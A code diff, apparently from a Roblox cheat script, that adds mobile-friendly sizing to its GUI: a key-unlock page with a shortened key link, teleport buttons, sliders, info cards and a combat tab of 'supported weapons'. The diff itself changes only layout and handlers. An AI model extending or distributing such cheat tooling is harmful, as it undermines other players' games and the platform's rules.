         d.TextColor3 = C.textMuted
-        d.TextSize = 10
+        d.TextSize = isMobile and 11 or 10
         d.Font = Enum.Font.Gotham
         d.TextXAlignment = Enum.TextXAlignment.Left
         d.ZIndex = 10
         d.Parent = btn
     end
+
     local arrow = Instance.new("TextLabel")
-    arrow.Size = UDim2.new(0, 20, 1, 0)
-    arrow.Position = UDim2.new(1, -26, 0, 0)
+    arrow.Size = UDim2.new(0, isMobile and 24 or 20, 1, 0)
+    arrow.Position = UDim2.new(1, isMobile and -30 or -26, 0, 0)
     arrow.BackgroundTransparency = 1
-    arrow.Text = ">"
+    arrow.Text = "›"
     arrow.TextColor3 = C.textMuted
-    arrow.TextSize = 14
+    arrow.TextSize = isMobile and 18 or 14
     arrow.Font = Enum.Font.GothamBold
     arrow.ZIndex = 10
     arrow.Parent = btn
-    btn.MouseEnter:Connect(function()
-        if not guiAlive then return end
-        tw(btn, 0.15, {BackgroundColor3 = C.cardHover})
-        tw(arrow, 0.15, {TextColor3 = C.accent, Position = UDim2.new(1, -22, 0, 0)})
-    end)
-    btn.MouseLeave:Connect(function()
-        if not guiAlive then return end
-        tw(btn, 0.15, {BackgroundColor3 = C.card})
-        tw(arrow, 0.15, {TextColor3 = C.textMuted, Position = UDim2.new(1, -26, 0, 0)})
-    end)
+
     btn.MouseButton1Click:Connect(function()
         if not guiAlive then return end
-        tw(btn, 0.08, {BackgroundColor3 = C.accent}, Enum.EasingStyle.Linear)
-        task.wait(0.08)
-        tw(btn, 0.2, {BackgroundColor3 = C.card})
+        tw(btn, 0.1, {BackgroundColor3 = C.accent}, Enum.EasingStyle.Linear)
+        tw(lbl, 0.1, {TextColor3 = C.white}, Enum.EasingStyle.Linear)
+        task.wait(0.1)
+        tw(btn, 0.25, {BackgroundColor3 = C.card})
+        tw(lbl, 0.25, {TextColor3 = C.text})
         if callback then callback() end
     end)
+
+    if not isMobile then
+        btn.MouseEnter:Connect(function()
+            if not guiAlive then return end
+            tw(btn, 0.15, {BackgroundColor3 = C.cardHover})
+            tw(arrow, 0.15, {TextColor3 = C.accent, Position = UDim2.new(1, -22, 0, 0)})
+        end)
+        btn.MouseLeave:Connect(function()
+            if not guiAlive then return end
+            tw(btn, 0.15, {BackgroundColor3 = C.card})
+            tw(arrow, 0.15, {TextColor3 = C.textMuted, Position = UDim2.new(1, -26, 0, 0)})
+        end)
+    end
+
     return btn
 end
 
 local function makeTeleportButton(parent, name, x, y, z, color, order, note)
     local hasNote = note and note ~= ""
-    local h = hasNote and 54 or 44
+    local h = hasNote and (isMobile and 64 or 54) or (isMobile and 52 or 44)
     local btn = Instance.new("TextButton")
     btn.Size = UDim2.new(1, 0, 0, h)
     btn.BackgroundColor3 = C.card
@@ -1273,123 +1330,137 @@ local function makeTeleportButton(parent, name, x, y, z, color, order, note)
     btn.ZIndex = 9
     btn.LayoutOrder = order or 0
     btn.Parent = parent
-    corner(btn, 8)
+    corner(btn, isMobile and 10 or 8)
+
     local bar = Instance.new("Frame")
-    bar.Size = UDim2.new(0, 3, 0.55, 0)
-    bar.Position = UDim2.new(0, 8, 0.225, 0)
+    bar.Size = UDim2.new(0, isMobile and 4 or 3, 0.55, 0)
+    bar.Position = UDim2.new(0, isMobile and 10 or 8, 0.225, 0)
     bar.BackgroundColor3 = color or C.accent
     bar.BorderSizePixel = 0
     bar.ZIndex = 10
     bar.Parent = btn
     corner(bar, 2)
+
     local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(1, -50, 0, 16)
-    lbl.Position = UDim2.new(0, 18, 0, hasNote and 4 or 6)
+    lbl.Size = UDim2.new(1, -55, 0, isMobile and 18 or 16)
+    lbl.Position = UDim2.new(0, isMobile and 20 or 18, 0, hasNote and (isMobile and 6 or 4) or (isMobile and 8 or 6))
     lbl.BackgroundTransparency = 1
     lbl.Text = name
     lbl.TextColor3 = C.text
-    lbl.TextSize = 12
+    lbl.TextSize = isMobile and 13 or 12
     lbl.Font = Enum.Font.GothamSemibold
     lbl.TextXAlignment = Enum.TextXAlignment.Left
     lbl.ZIndex = 10
     lbl.Parent = btn
+
     local coords = Instance.new("TextLabel")
-    coords.Size = UDim2.new(1, -24, 0, 12)
-    coords.Position = UDim2.new(0, 18, 0, hasNote and 20 or 24)
+    coords.Size = UDim2.new(1, -28, 0, isMobile and 14 or 12)
+    coords.Position = UDim2.new(0, isMobile and 20 or 18, 0, hasNote and (isMobile and 24 or 20) or (isMobile and 28 or 24))
     coords.BackgroundTransparency = 1
     coords.Text = string.format("X: %d  Y: %d  Z: %d", x, y, z)
     coords.TextColor3 = C.textMuted
-    coords.TextSize = 9
+    coords.TextSize = isMobile and 10 or 9
     coords.Font = Enum.Font.Gotham
     coords.TextXAlignment = Enum.TextXAlignment.Left
     coords.ZIndex = 10
     coords.Parent = btn
+
     if hasNote then
         local noteLabel = Instance.new("TextLabel")
-        noteLabel.Size = UDim2.new(1, -24, 0, 12)
-        noteLabel.Position = UDim2.new(0, 18, 0, 36)
+        noteLabel.Size = UDim2.new(1, -28, 0, isMobile and 14 or 12)
+        noteLabel.Position = UDim2.new(0, isMobile and 20 or 18, 0, isMobile and 42 or 36)
         noteLabel.BackgroundTransparency = 1
         noteLabel.Text = note
         noteLabel.TextColor3 = C.orange
-        noteLabel.TextSize = 9
+        noteLabel.TextSize = isMobile and 10 or 9
         noteLabel.Font = Enum.Font.GothamSemibold
         noteLabel.TextXAlignment = Enum.TextXAlignment.Left
         noteLabel.ZIndex = 10
         noteLabel.Parent = btn
     end
+
     local tpText = Instance.new("TextLabel")
-    tpText.Size = UDim2.new(0, 24, 1, 0)
-    tpText.Position = UDim2.new(1, -32, 0, 0)
+    tpText.Size = UDim2.new(0, isMobile and 28 or 24, 1, 0)
+    tpText.Position = UDim2.new(1, isMobile and -36 or -32, 0, 0)
     tpText.BackgroundTransparency = 1
-    tpText.Text = ">>"
+    tpText.Text = "››"
     tpText.TextColor3 = C.textMuted
-    tpText.TextSize = 10
+    tpText.TextSize = isMobile and 12 or 10
     tpText.Font = Enum.Font.GothamBold
     tpText.ZIndex = 10
     tpText.Parent = btn
-    btn.MouseEnter:Connect(function()
-        if not guiAlive then return end
-        tw(btn, 0.15, {BackgroundColor3 = C.cardHover})
-        tw(bar, 0.15, {BackgroundColor3 = C.white})
-        tw(tpText, 0.15, {TextColor3 = color or C.accent})
-    end)
-    btn.MouseLeave:Connect(function()
-        if not guiAlive then return end
-        tw(btn, 0.15, {BackgroundColor3 = C.card})
-        tw(bar, 0.15, {BackgroundColor3 = color or C.accent})
-        tw(tpText, 0.15, {TextColor3 = C.textMuted})
-    end)
+
     btn.MouseButton1Click:Connect(function()
         if not guiAlive then return end
-        tw(btn, 0.08, {BackgroundColor3 = C.green}, Enum.EasingStyle.Linear)
-        tw(lbl, 0.08, {TextColor3 = C.white}, Enum.EasingStyle.Linear)
+        tw(btn, 0.1, {BackgroundColor3 = C.green}, Enum.EasingStyle.Linear)
+        tw(lbl, 0.1, {TextColor3 = C.white}, Enum.EasingStyle.Linear)
         teleportTo(x, y, z)
-        task.wait(0.15)
-        tw(btn, 0.25, {BackgroundColor3 = C.card})
-        tw(lbl, 0.25, {TextColor3 = C.text})
+        task.wait(0.2)
+        tw(btn, 0.3, {BackgroundColor3 = C.card})
+        tw(lbl, 0.3, {TextColor3 = C.text})
     end)
+
+    if not isMobile then
+        btn.MouseEnter:Connect(function()
+            if not guiAlive then return end
+            tw(btn, 0.15, {BackgroundColor3 = C.cardHover})
+            tw(bar, 0.15, {BackgroundColor3 = C.white})
+            tw(tpText, 0.15, {TextColor3 = color or C.accent})
+        end)
+        btn.MouseLeave:Connect(function()
+            if not guiAlive then return end
+            tw(btn, 0.15, {BackgroundColor3 = C.card})
+            tw(bar, 0.15, {BackgroundColor3 = color or C.accent})
+            tw(tpText, 0.15, {TextColor3 = C.textMuted})
+        end)
+    end
+
     return btn
 end
 
 local function makeSlider(parent, text, min, max, default, order, callback)
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 0, 52)
+    frame.Size = UDim2.new(1, 0, 0, isMobile and 64 or 52)
     frame.BackgroundColor3 = C.card
     frame.BorderSizePixel = 0
     frame.ZIndex = 9
     frame.LayoutOrder = order or 0
     frame.Parent = parent
-    corner(frame, 8)
+    corner(frame, isMobile and 10 or 8)
+
     local lbl = Instance.new("TextLabel")
-    lbl.Size = UDim2.new(0.6, 0, 0, 18)
-    lbl.Position = UDim2.new(0, 14, 0, 6)
+    lbl.Size = UDim2.new(0.6, 0, 0, isMobile and 20 or 18)
+    lbl.Position = UDim2.new(0, isMobile and 16 or 14, 0, isMobile and 8 or 6)
     lbl.BackgroundTransparency = 1
     lbl.Text = text
     lbl.TextColor3 = C.text
-    lbl.TextSize = 12
+    lbl.TextSize = isMobile and 13 or 12
     lbl.Font = Enum.Font.GothamSemibold
     lbl.TextXAlignment = Enum.TextXAlignment.Left
     lbl.ZIndex = 10
     lbl.Parent = frame
+
     local valLbl = Instance.new("TextLabel")
-    valLbl.Size = UDim2.new(0.3, 0, 0, 18)
-    valLbl.Position = UDim2.new(0.7, -14, 0, 6)
+    valLbl.Size = UDim2.new(0.3, 0, 0, isMobile and 20 or 18)
+    valLbl.Position = UDim2.new(0.7, isMobile and -16 or -14, 0, isMobile and 8 or 6)
     valLbl.BackgroundTransparency = 1
     valLbl.Text = tostring(default)
     valLbl.TextColor3 = C.accent
-    valLbl.TextSize = 12
+    valLbl.TextSize = isMobile and 13 or 12
     valLbl.Font = Enum.Font.GothamBold
     valLbl.TextXAlignment = Enum.TextXAlignment.Right
     valLbl.ZIndex = 10
     valLbl.Parent = frame
+
     local trackBG = Instance.new("Frame")
-    trackBG.Size = UDim2.new(1, -28, 0, 4)
-    trackBG.Position = UDim2.new(0, 14, 0, 36)
+    trackBG.Size = UDim2.new(1, isMobile and -32 or -28, 0, isMobile and 6 or 4)
+    trackBG.Position = UDim2.new(0, isMobile and 16 or 14, 0, isMobile and 42 or 36)
     trackBG.BackgroundColor3 = C.toggleOff
     trackBG.BorderSizePixel = 0
     trackBG.ZIndex = 10
     trackBG.Parent = frame
-    corner(trackBG, 2)
+    corner(trackBG, isMobile and 3 or 2)
+
     local pct = (default - min) / (max - min)
     local fill = Instance.new("Frame")
     fill.Size = UDim2.new(pct, 0, 1, 0)
@@ -1397,23 +1468,26 @@ local function makeSlider(parent, text, min, max, default, order, callback)
     fill.BorderSizePixel = 0
     fill.ZIndex = 11
     fill.Parent = trackBG
-    corner(fill, 2)
+    corner(fill, isMobile and 3 or 2)
+
     local knobF = Instance.new("Frame")
-    knobF.Size = UDim2.new(0, 12, 0, 12)
-    knobF.Position = UDim2.new(pct, -6, 0.5, -6)
+    knobF.Size = UDim2.new(0, isMobile and 16 or 12, 0, isMobile and 16 or 12)
+    knobF.Position = UDim2.new(pct, isMobile and -8 or -6, 0.5, isMobile and -8 or -6)
     knobF.BackgroundColor3 = C.white
     knobF.BorderSizePixel = 0
     knobF.ZIndex = 12
     knobF.Parent = trackBG
-    corner(knobF, 6)
+    corner(knobF, isMobile and 8 or 6)
+
     local sliding = false
     local inputBtn = Instance.new("TextButton")
-    inputBtn.Size = UDim2.new(1, 10, 0, 20)
-    inputBtn.Position = UDim2.new(0, -5, 0, -8)
+    inputBtn.Size = UDim2.new(1, isMobile and 12 or 10, 0, isMobile and 24 or 20)
+    inputBtn.Position = UDim2.new(0, isMobile and -6 or -5, 0, isMobile and -9 or -8)
     inputBtn.BackgroundTransparency = 1
     inputBtn.Text = ""
     inputBtn.ZIndex = 13
     inputBtn.Parent = trackBG
+
     local function update(inputPos)
         if not guiAlive then return end
         local abs = trackBG.AbsolutePosition.X
@@ -1422,65 +1496,80 @@ local function makeSlider(parent, text, min, max, default, order, callback)
         local val = math.floor(min + (max - min) * rel + 0.5)
         local newPct = (val - min) / (max - min)
         fill.Size = UDim2.new(newPct, 0, 1, 0)
-        knobF.Position = UDim2.new(newPct, -6, 0.5, -6)
+        knobF.Position = UDim2.new(newPct, isMobile and -8 or -6, 0.5, isMobile and -8 or -6)
         valLbl.Text = tostring(val)
         if callback then callback(val) end
     end
+
     inputBtn.MouseButton1Down:Connect(function() sliding = true end)
+    
     UserInputService.InputEnded:Connect(function(input)
-        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then sliding = false end
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then 
+            sliding = false 
+        end
     end)
+    
     UserInputService.InputChanged:Connect(function(input)
         if not guiAlive then return end
-        if sliding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then update(input.Position) end
+        if sliding and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then 
+            update(input.Position) 
+        end
     end)
+    
     inputBtn.MouseButton1Click:Connect(function()
         if not guiAlive then return end
-        update(UserInputService:GetMouseLocation())
+        local mousePos = UserInputService:GetMouseLocation()
+        update(mousePos)
     end)
+
     return frame
 end
 
 local function makeInfoCard(parent, title, value, color, order)
     local frame = Instance.new("Frame")
-    frame.Size = UDim2.new(1, 0, 0, 48)
+    frame.Size = UDim2.new(1, 0, 0, isMobile and 56 or 48)
     frame.BackgroundColor3 = C.card
     frame.BorderSizePixel = 0
     frame.ZIndex = 9
     frame.LayoutOrder = order or 0
     frame.Parent = parent
-    corner(frame, 8)
+    corner(frame, isMobile and 10 or 8)
+
     local bar = Instance.new("Frame")
-    bar.Size = UDim2.new(0, 3, 0.6, 0)
-    bar.Position = UDim2.new(0, 8, 0.2, 0)
+    bar.Size = UDim2.new(0, isMobile and 4 or 3, 0.6, 0)
+    bar.Position = UDim2.new(0, isMobile and 10 or 8, 0.2, 0)
     bar.BackgroundColor3 = color or C.accent
     bar.BorderSizePixel = 0
     bar.ZIndex = 10
     bar.Parent = frame
     corner(bar, 2)
+
     local t = Instance.new("TextLabel")
-    t.Size = UDim2.new(1, -24, 0, 14)
-    t.Position = UDim2.new(0, 18, 0, 8)
+    t.Size = UDim2.new(1, -28, 0, isMobile and 16 or 14)
+    t.Position = UDim2.new(0, isMobile and 20 or 18, 0, isMobile and 10 or 8)
     t.BackgroundTransparency = 1
     t.Text = title
     t.TextColor3 = C.textMuted
-    t.TextSize = 10
+    t.TextSize = isMobile and 11 or 10
     t.Font = Enum.Font.Gotham
     t.TextXAlignment = Enum.TextXAlignment.Left
     t.ZIndex = 10
     t.Parent = frame
+
     local v = Instance.new("TextLabel")
     v.Name = "Value"
-    v.Size = UDim2.new(1, -24, 0, 18)
-    v.Position = UDim2.new(0, 18, 0, 24)
+    v.Size = UDim2.new(1, -28, 0, isMobile and 20 or 18)
+    v.Position = UDim2.new(0, isMobile and 20 or 18, 0, isMobile and 28 or 24)
     v.BackgroundTransparency = 1
     v.Text = value
     v.TextColor3 = C.text
-    v.TextSize = 14
+    v.TextSize = isMobile and 15 or 14
     v.Font = Enum.Font.GothamBold
     v.TextXAlignment = Enum.TextXAlignment.Left
+    v.TextTruncate = Enum.TextTruncate.AtEnd
     v.ZIndex = 10
     v.Parent = frame
+
     return frame
 end
 
@@ -1489,82 +1578,100 @@ end
 -- ============================
 local keyPage = tabPages[1]
 makeSection(keyPage, "Authentication Required", 1)
+
 local keyInfo = Instance.new("Frame")
-keyInfo.Size = UDim2.new(1, 0, 0, 58)
+keyInfo.Size = UDim2.new(1, 0, 0, isMobile and 68 or 58)
 keyInfo.BackgroundColor3 = C.card
 keyInfo.BorderSizePixel = 0
 keyInfo.ZIndex = 9
 keyInfo.LayoutOrder = 2
 keyInfo.Parent = keyPage
-corner(keyInfo, 8)
+corner(keyInfo, isMobile and 10 or 8)
+
 local keyInfoBar = Instance.new("Frame")
-keyInfoBar.Size = UDim2.new(0, 3, 0.6, 0)
-keyInfoBar.Position = UDim2.new(0, 8, 0.2, 0)
+keyInfoBar.Size = UDim2.new(0, isMobile and 4 or 3, 0.6, 0)
+keyInfoBar.Position = UDim2.new(0, isMobile and 10 or 8, 0.2, 0)
 keyInfoBar.BackgroundColor3 = C.accent
 keyInfoBar.BorderSizePixel = 0
 keyInfoBar.ZIndex = 10
 keyInfoBar.Parent = keyInfo
 corner(keyInfoBar, 2)
+
 local keyInfoTitle = Instance.new("TextLabel")
-keyInfoTitle.Size = UDim2.new(1, -24, 0, 16)
-keyInfoTitle.Position = UDim2.new(0, 18, 0, 10)
+keyInfoTitle.Size = UDim2.new(1, -28, 0, isMobile and 18 or 16)
+keyInfoTitle.Position = UDim2.new(0, isMobile and 20 or 18, 0, isMobile and 12 or 10)
 keyInfoTitle.BackgroundTransparency = 1
 keyInfoTitle.Text = "Enter your key to unlock all features"
 keyInfoTitle.TextColor3 = C.text
-keyInfoTitle.TextSize = 12
+keyInfoTitle.TextSize = isMobile and 13 or 12
 keyInfoTitle.Font = Enum.Font.GothamSemibold
 keyInfoTitle.TextXAlignment = Enum.TextXAlignment.Left
 keyInfoTitle.ZIndex = 10
 keyInfoTitle.Parent = keyInfo
+
 local keyInfoDesc = Instance.new("TextLabel")
-keyInfoDesc.Size = UDim2.new(1, -24, 0, 14)
-keyInfoDesc.Position = UDim2.new(0, 18, 0, 30)
+keyInfoDesc.Size = UDim2.new(1, -28, 0, isMobile and 16 or 14)
+keyInfoDesc.Position = UDim2.new(0, isMobile and 20 or 18, 0, isMobile and 34 or 30)
 keyInfoDesc.BackgroundTransparency = 1
 keyInfoDesc.Text = "All tabs are locked until a valid key is provided."
 keyInfoDesc.TextColor3 = C.textMuted
-keyInfoDesc.TextSize = 10
+keyInfoDesc.TextSize = isMobile and 11 or 10
 keyInfoDesc.Font = Enum.Font.Gotham
 keyInfoDesc.TextXAlignment = Enum.TextXAlignment.Left
 keyInfoDesc.ZIndex = 10
 keyInfoDesc.Parent = keyInfo
+
 local keyInputFrame = Instance.new("Frame")
-keyInputFrame.Size = UDim2.new(1, 0, 0, 38)
+keyInputFrame.Size = UDim2.new(1, 0, 0, isMobile and 46 or 38)
 keyInputFrame.BackgroundColor3 = C.input
 keyInputFrame.BorderSizePixel = 0
 keyInputFrame.ZIndex = 9
 keyInputFrame.LayoutOrder = 3
 keyInputFrame.Parent = keyPage
-corner(keyInputFrame, 8)
-local keyInputStroke = stroke(keyInputFrame, C.inputBorder, 1, 0.4)
+corner(keyInputFrame, isMobile and 10 or 8)
+
+local keyInputStroke = stroke(keyInputFrame, C.inputBorder, isMobile and 2 or 1, 0.4)
+
 local keyInput = Instance.new("TextBox")
-keyInput.Size = UDim2.new(1, -20, 1, 0)
-keyInput.Position = UDim2.new(0, 10, 0, 0)
+keyInput.Size = UDim2.new(1, -24, 1, 0)
+keyInput.Position = UDim2.new(0, 12, 0, 0)
 keyInput.BackgroundTransparency = 1
 keyInput.Text = ""
 keyInput.PlaceholderText = "Enter key here..."
 keyInput.PlaceholderColor3 = C.textMuted
 keyInput.TextColor3 = C.text
-keyInput.TextSize = 13
+keyInput.TextSize = isMobile and 14 or 13
 keyInput.Font = Enum.Font.GothamSemibold
 keyInput.TextXAlignment = Enum.TextXAlignment.Left
 keyInput.ClearTextOnFocus = false
 keyInput.ZIndex = 10
 keyInput.Parent = keyInputFrame
-keyInput.Focused:Connect(function() if guiAlive then tw(keyInputStroke, 0.2, {Color = C.accent, Transparency = 0}) end end)
-keyInput.FocusLost:Connect(function() if guiAlive then tw(keyInputStroke, 0.2, {Color = C.inputBorder, Transparency = 0.4}) end end)
+
+keyInput.Focused:Connect(function() 
+    if guiAlive then 
+        tw(keyInputStroke, 0.2, {Color = C.accent, Transparency = 0}) 
+    end 
+end)
+keyInput.FocusLost:Connect(function() 
+    if guiAlive then 
+        tw(keyInputStroke, 0.2, {Color = C.inputBorder, Transparency = 0.4}) 
+    end 
+end)
+
 local keyStatus = Instance.new("TextLabel")
-keyStatus.Size = UDim2.new(1, 0, 0, 16)
+keyStatus.Size = UDim2.new(1, 0, 0, isMobile and 18 or 16)
 keyStatus.BackgroundTransparency = 1
 keyStatus.Text = ""
 keyStatus.TextColor3 = C.red
-keyStatus.TextSize = 11
+keyStatus.TextSize = isMobile and 12 or 11
 keyStatus.Font = Enum.Font.GothamSemibold
 keyStatus.TextXAlignment = Enum.TextXAlignment.Left
 keyStatus.ZIndex = 10
 keyStatus.LayoutOrder = 4
 keyStatus.Parent = keyPage
+
 local keySubmit = Instance.new("TextButton")
-keySubmit.Size = UDim2.new(1, 0, 0, 38)
+keySubmit.Size = UDim2.new(1, 0, 0, isMobile and 46 or 38)
 keySubmit.BackgroundColor3 = C.accent
 keySubmit.BorderSizePixel = 0
 keySubmit.Text = ""
@@ -1572,20 +1679,25 @@ keySubmit.AutoButtonColor = false
 keySubmit.ZIndex = 9
 keySubmit.LayoutOrder = 5
 keySubmit.Parent = keyPage
-corner(keySubmit, 8)
+corner(keySubmit, isMobile and 10 or 8)
+
 local keySubmitText = Instance.new("TextLabel")
 keySubmitText.Size = UDim2.new(1, 0, 1, 0)
 keySubmitText.BackgroundTransparency = 1
 keySubmitText.Text = "Validate Key"
 keySubmitText.TextColor3 = C.white
-keySubmitText.TextSize = 13
+keySubmitText.TextSize = isMobile and 14 or 13
 keySubmitText.Font = Enum.Font.GothamBold
 keySubmitText.ZIndex = 10
 keySubmitText.Parent = keySubmit
-keySubmit.MouseEnter:Connect(function() if guiAlive then tw(keySubmit, 0.15, {BackgroundColor3 = C.accentHover}) end end)
-keySubmit.MouseLeave:Connect(function() if guiAlive then tw(keySubmit, 0.15, {BackgroundColor3 = C.accent}) end end)
+
+if not isMobile then
+    keySubmit.MouseEnter:Connect(function() if guiAlive then tw(keySubmit, 0.15, {BackgroundColor3 = C.accentHover}) end end)
+    keySubmit.MouseLeave:Connect(function() if guiAlive then tw(keySubmit, 0.15, {BackgroundColor3 = C.accent}) end end)
+end
+
 local keyCopyBtn = Instance.new("TextButton")
-keyCopyBtn.Size = UDim2.new(1, 0, 0, 34)
+keyCopyBtn.Size = UDim2.new(1, 0, 0, isMobile and 40 or 34)
 keyCopyBtn.BackgroundColor3 = C.card
 keyCopyBtn.BorderSizePixel = 0
 keyCopyBtn.Text = ""
@@ -1593,18 +1705,23 @@ keyCopyBtn.AutoButtonColor = false
 keyCopyBtn.ZIndex = 9
 keyCopyBtn.LayoutOrder = 6
 keyCopyBtn.Parent = keyPage
-corner(keyCopyBtn, 8)
+corner(keyCopyBtn, isMobile and 10 or 8)
+
 local keyCopyText = Instance.new("TextLabel")
 keyCopyText.Size = UDim2.new(1, 0, 1, 0)
 keyCopyText.BackgroundTransparency = 1
 keyCopyText.Text = "Get Key"
 keyCopyText.TextColor3 = C.textDim
-keyCopyText.TextSize = 11
+keyCopyText.TextSize = isMobile and 12 or 11
 keyCopyText.Font = Enum.Font.GothamSemibold
 keyCopyText.ZIndex = 10
 keyCopyText.Parent = keyCopyBtn
-keyCopyBtn.MouseEnter:Connect(function() if guiAlive then tw(keyCopyBtn, 0.15, {BackgroundColor3 = C.cardHover}) end end)
-keyCopyBtn.MouseLeave:Connect(function() if guiAlive then tw(keyCopyBtn, 0.15, {BackgroundColor3 = C.card}) end end)
+
+if not isMobile then
+    keyCopyBtn.MouseEnter:Connect(function() if guiAlive then tw(keyCopyBtn, 0.15, {BackgroundColor3 = C.cardHover}) end end)
+    keyCopyBtn.MouseLeave:Connect(function() if guiAlive then tw(keyCopyBtn, 0.15, {BackgroundColor3 = C.card}) end end)
+end
+
 keyCopyBtn.MouseButton1Click:Connect(function()
     if not guiAlive then return end
     pcall(function() setclipboard("https://spoo.me/key") end)
@@ -1619,7 +1736,11 @@ end)
 local function validateKey()
     if not guiAlive then return end
     local entered = keyInput.Text
-    if entered == "" then keyStatus.Text = "Please enter a key." keyStatus.TextColor3 = C.yellow return end
+    if entered == "" then 
+        keyStatus.Text = "Please enter a key." 
+        keyStatus.TextColor3 = C.yellow 
+        return 
+    end
     keySubmitText.Text = "Checking..."
     tw(keySubmit, 0.15, {BackgroundColor3 = C.textMuted})
     task.wait(0.8)
@@ -1629,6 +1750,7 @@ local function validateKey()
         keyStatus.TextColor3 = C.green
         tw(keySubmit, 0.3, {BackgroundColor3 = C.green})
         keySubmitText.Text = "Unlocked!"
+        createNotification("Success", "Key validated! All features unlocked.", 3, C.green)
         task.wait(0.5)
         if not guiAlive then return end
         unlockAllTabs()
@@ -1643,8 +1765,10 @@ local function validateKey()
         keySubmitText.Text = "Invalid Key"
         local orig = keyInputFrame.Position
         for _ = 1, 3 do
-            tw(keyInputFrame, 0.04, {Position = orig + UDim2.new(0, 6, 0, 0)}, Enum.EasingStyle.Linear) task.wait(0.04)
-            tw(keyInputFrame, 0.04, {Position = orig + UDim2.new(0, -6, 0, 0)}, Enum.EasingStyle.Linear) task.wait(0.04)
+            tw(keyInputFrame, 0.04, {Position = orig + UDim2.new(0, 8, 0, 0)}, Enum.EasingStyle.Linear) 
+            task.wait(0.04)
+            tw(keyInputFrame, 0.04, {Position = orig + UDim2.new(0, -8, 0, 0)}, Enum.EasingStyle.Linear) 
+            task.wait(0.04)
         end
         tw(keyInputFrame, 0.04, {Position = orig}, Enum.EasingStyle.Linear)
         task.wait(0.6)
@@ -1653,8 +1777,11 @@ local function validateKey()
         keySubmitText.Text = "Validate Key"
     end
 end
+
 keySubmit.MouseButton1Click:Connect(validateKey)
-keyInput.FocusLost:Connect(function(enterPressed) if enterPressed then validateKey() end end)
+keyInput.FocusLost:Connect(function(enterPressed) 
+    if enterPressed then validateKey() end 
+end)
 
 -- ============================
 -- HOME
@@ -1678,7 +1805,10 @@ local uptimeCard = makeInfoCard(home, "Server Uptime", formatUptime(workspace.Di
 task.spawn(function()
     while task.wait(1) do
         if not guiAlive then break end
-        pcall(function() local val = uptimeCard:FindFirstChild("Value") if val then val.Text = formatUptime(workspace.DistributedGameTime) end end)
+        pcall(function() 
+            local val = uptimeCard:FindFirstChild("Value") 
+            if val then val.Text = formatUptime(workspace.DistributedGameTime) end 
+        end)
     end
 end)
 
@@ -1686,17 +1816,33 @@ local playerCountCard = nil
 for _, child in ipairs(home:GetChildren()) do
     if child:IsA("Frame") then
         local valLabel = child:FindFirstChild("Value")
-        if valLabel and valLabel.Text:find("/") then playerCountCard = child break end
+        if valLabel and valLabel.Text:find("/") then 
+            playerCountCard = child 
+            break 
+        end
     end
 end
+
 Players.PlayerAdded:Connect(function()
     if not guiAlive then return end
-    pcall(function() if playerCountCard then local val = playerCountCard:FindFirstChild("Value") if val then val.Text = #Players:GetPlayers() .. " / " .. Players.MaxPlayers end end end)
+    pcall(function() 
+        if playerCountCard then 
+            local val = playerCountCard:FindFirstChild("Value") 
+            if val then val.Text = #Players:GetPlayers() .. " / " .. Players.MaxPlayers end 
+        end 
+    end)
 end)
+
 Players.PlayerRemoving:Connect(function()
     if not guiAlive then return end
-    pcall(function() if playerCountCard then local val = playerCountCard:FindFirstChild("Value") if val then val.Text = #Players:GetPlayers() .. " / " .. Players.MaxPlayers end end end)
+    pcall(function() 
+        if playerCountCard then 
+            local val = playerCountCard:FindFirstChild("Value") 
+            if val then val.Text = #Players:GetPlayers() .. " / " .. Players.MaxPlayers end 
+        end 
+    end)
 end)
+
 makeInfoCard(home, "Version", "v1.0.0", C.yellow, 6)
 local gameName = "Unknown"
 pcall(function() gameName = MarketplaceService:GetProductInfo(game.PlaceId).Name end)
@@ -1706,7 +1852,8 @@ updateHomePlayerCard = function()
     pcall(function()
         local valLabel = homePlayerCard:FindFirstChild("Value")
         if valLabel then
-            if nameHiderEnabled then valLabel.Text = customFakeName else valLabel.Text = LocalPlayer.Name end
+            if nameHiderEnabled then valLabel.Text = customFakeName 
+            else valLabel.Text = LocalPlayer.Name end
         end
     end)
 end
@@ -1716,40 +1863,45 @@ end
 -- ============================
 local combat = tabPages[3]
 local supportNote = Instance.new("Frame")
-supportNote.Size = UDim2.new(1, 0, 0, 52)
+supportNote.Size = UDim2.new(1, 0, 0, isMobile and 62 or 52)
 supportNote.BackgroundColor3 = C.card
 supportNote.BorderSizePixel = 0
 supportNote.ZIndex = 9
 supportNote.LayoutOrder = 1
 supportNote.Parent = combat
-corner(supportNote, 8)
-Instance.new("Frame", supportNote).Size = UDim2.new(0, 3, 0.6, 0)
-local sBar = supportNote:FindFirstChildOfClass("Frame")
-sBar.Position = UDim2.new(0, 8, 0.2, 0)
+corner(supportNote, isMobile and 10 or 8)
+
+local sBar = Instance.new("Frame")
+sBar.Size = UDim2.new(0, isMobile and 4 or 3, 0.6, 0)
+sBar.Position = UDim2.new(0, isMobile and 10 or 8, 0.2, 0)
 sBar.BackgroundColor3 = C.yellow
 sBar.BorderSizePixel = 0
 sBar.ZIndex = 10
+sBar.Parent = supportNote
 corner(sBar, 2)
+
 local supportTitle = Instance.new("TextLabel")
-supportTitle.Size = UDim2.new(1, -24, 0, 14)
-supportTitle.Position = UDim2.new(0, 18, 0, 8)
+supportTitle.Size = UDim2.new(1, -28, 0, isMobile and 16 or 14)
+supportTitle.Position = UDim2.new(0, isMobile and 20 or 18, 0, isMobile and 10 or 8)
 supportTitle.BackgroundTransparency = 1
 supportTitle.Text = "SUPPORTED WEAPONS"
 supportTitle.TextColor3 = C.yellow
-supportTitle.TextSize = 10
+supportTitle.TextSize = isMobile and 11 or 10
 supportTitle.Font = Enum.Font.GothamBold
 supportTitle.TextXAlignment = Enum.TextXAlignment.Left
 supportTitle.ZIndex = 10
 supportTitle.Parent = supportNote
+
 local supportDesc = Instance.new("TextLabel")
-supportDesc.Size = UDim2.new(1, -24, 0, 14)
-supportDesc.Position = UDim2.new(0, 18, 0, 26)
+supportDesc.Size = UDim2.new(1, -28, 0, isMobile and 16 or 14)
